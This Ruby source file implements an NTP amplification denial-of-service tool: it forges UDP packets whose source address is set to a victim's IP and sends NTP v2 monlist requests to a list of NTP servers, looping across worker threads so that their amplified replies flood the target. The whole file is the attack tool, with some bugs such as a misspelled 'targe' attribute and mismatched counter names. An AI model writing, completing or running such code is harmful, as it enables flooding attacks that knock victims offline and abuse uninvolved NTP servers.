require 'socket'
require 'racket'
require 'resolv'

class Counter
  attr_accessor :count, :mutex, :threshold

  def initialize(threshold)
    self.counter = 0
    self.threshold = threshold
    @mutex = Mutex.new
  end

  def succ
    @mutex.synchronize do
      self.counter += 1
    end
  end

  def get_index
    @mutex.synchronize do
      self.counter % self.threshold
    end

  end
end

class NTPDOS
  attr_accessor :ntplist

  def initialize(target, counter, times=-1, payload=nil)
    @sport = 48947
    @dport = 123
    @target = target
    #Magic Packet aka NTP v2 Monlist Packet
    @payload = payload || "\x17\x00\x03\x2a" + "\x00" * 4
    @counter = counter
    @times = times
  end

  def run
    if @times == -1
      run_infinite
    end
    run_n_times
  end

  def run_infinite
    while 1
      self.deny
    end
  end

  def run_n_times
    t = 0
    while t < @times
      self.deny
      t +=1
    end
  end

  def deny
    current_server_index = @counter.get_index
    ntp_server = self.ntplist[current_server_index]
    @counter.succ
    packet = self.build_packet ntp_server
    f = packet.sendpacket
    # print out what we built
    packet.layers.compact.each do |l|
      puts l.pretty
    end
    puts "Sent #{f}"
  end

  def build_packet(ntp_server)
    n = Racket::Racket.new
    n.iface = "wlan0"
    # skip right to layer3, layer2 will be done automatically
    # build a new IPv4 layer, and assign src and dst ip from the command line
    n.l3 = IPv4.new
    n.l3.src_ip = ntp_server
    n.l3.dst_ip = @target
    n.l3.protocol = 0x11

    # stack on UDP
    n.l4 = UDP.new
    n.l4.src_port = @dport
    n.l4.dst_port = @sport
    # build a random amount of garbage for the payload
    n.l4.payload = @payload

    # fix 'er  up (checksum, length) prior to sending
    n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)

    n
  end
end

class NTPDOSProgram
  attr_accessor :ntplist, :workers_count, :target, :counter, :times, :pool

  def initialize(workers_count, ntplist, times)
    self.ntplist = ntplist.map { |ntp|
      if self.is_host? ntp
        self.resolve_hosts(ntp)
      else
        ntp
      end }
    self.workers_count = workers_count
    self.check_worker_count
    self.counter = Counter.new self.ntplist.length
    self.times = times
    self.pool = Pool.new(self.workers_count)
  end

  def check_worker_count
    if self.workers_count < self.ntplist.length
      raise NTPDOSException, 'Thread count should be equal or superior to ntplist'
    end
  end

  def resolve_hosts(ntp)
    Resolv.getaddress ntp
  end

  def is_host?(ntp_server)
    ['www', 'http'].any? { |c| ntp_server.start_with? c }
  end

  def run_workers
    self.workers_count.times do
      self.pool.schedule do
        run_worker(self.ntplist, self.targe, self.counter, self.times)
      end
    end
    at_exit { self.pool.shutdown }
  end

end

def run_worker(ntplist, target, counter, times)
  dos = NTPDOS.new target, counter, times
  dos.ntplist = ntplist
  dos.run
end

class NTPDOSException < StandardError
end